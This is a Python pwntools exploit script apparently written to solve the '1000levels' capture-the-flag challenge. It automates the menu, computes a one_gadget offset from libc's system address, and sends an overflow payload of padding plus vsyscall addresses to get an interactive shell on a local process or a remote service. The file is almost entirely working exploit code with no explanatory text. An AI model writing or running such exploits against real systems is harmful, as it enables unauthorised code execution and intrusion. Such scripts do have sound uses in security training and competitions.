from pwn import *

context(arch='x86_64', os='linux', log_level='debug')

def input_choice(target, choice):
    target.recvuntil("Choice:\n")
    target.sendline(str(choice))

def input_level(target, level1, level2):
    target.recvuntil("How many levels?\n")
    target.sendline(str(level1))
    target.recvuntil("Any more?\n")
    target.sendline(str(level2))

def auto_answer(target, level, last_answer):
    for index in xrange(0, level):
        target.recvuntil("Question: ")
        temp = target.recvuntil("= ?").strip("= ?").strip().split("*")
        target.recvuntil("Answer:")
        if index == level -1 :
            # XXX: use send() instead of sendline()
            target.send(last_answer)
        else:
            target.send(str(int(temp[0]) * int(temp[1])))

LOCAL = 1
DEBUG = 0
image_base = 0x555555554000     # disable ASLR for debug purpose

if LOCAL:
    # FIXME: error occurred when run with the provided libc
    # target = process('./1000levels_patch', env={'LD_PRELOAD': './libc.so'})
    target = process('./1000levels_patch')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget_offset = 0x4526a     # constraints: [$rsp+0x30] = 0
else:
    target = remote('127.0.0.1', 1234)
    libc = ELF('./libc.so')
    one_gadget_offset = 0x4526a     # constraints: [$rsp+0x30] = 0

if DEBUG:
    pwnlib.gdb.attach(target, 'b *%#x\nc\n' % (image_base + 0xec2))

system_offset = libc.symbols['system']
vsyscall_address = 0xffffffffff600400   # XXX: error occurred when using 0xffffffffff600000

input_choice(target, 2)

input_choice(target, 1)

first_level = -1
second_level = one_gadget_offset - system_offset
input_level(target, first_level, second_level)

payload = '1' * 0x38
payload += p64(vsyscall_address) * 3
auto_answer(target, 1000, payload)

target.interactive()